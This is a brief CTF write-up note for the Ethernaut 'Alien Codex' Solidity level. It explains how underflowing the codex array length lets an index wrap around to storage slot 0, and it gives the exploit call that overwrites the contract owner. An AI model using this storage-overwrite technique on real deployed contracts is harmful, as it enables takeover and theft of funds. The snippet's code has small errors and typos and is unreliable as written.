[19 - Alien Codex](https://ethernaut.openzeppelin.com/level/0x40055E69E7EB12620c8CCBCCAb1F187883301c30)

* You can access an array's elements up until array.length. 
* Array.length should never be modified directly
* ```contract.retract()``` will make ```codex.length``` underflow and become ```2^256 - 1```, since it uses Solidity 5 without underflow/overflow checks => we can access ```codex[<any_position>]```
* https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html#mappings-and-dynamic-arrays shows where elements in dynamic arrays are stored
* ```contact``` and ```owner``` are on slot 0 of the smart contract
* we need to alter specific array index to actually alter slot 0 in smart contract
* array is on position 1 =>
codex[0]                                        => keccak256(1) + 0
codex[1]                                        => keccak256(1) + 1
codex[2 ^ 256 - 1 - keccak256(1) - 1]           => 2 ^ 256 - 1 
codex[2 ^ 256 - keccak256(1) - 1]               => 0
* codex.revise(type(uint256).max - keccak256(bytes(1)), bytes(tx.origin))
* assertEq(codes.owner(), tx.origin);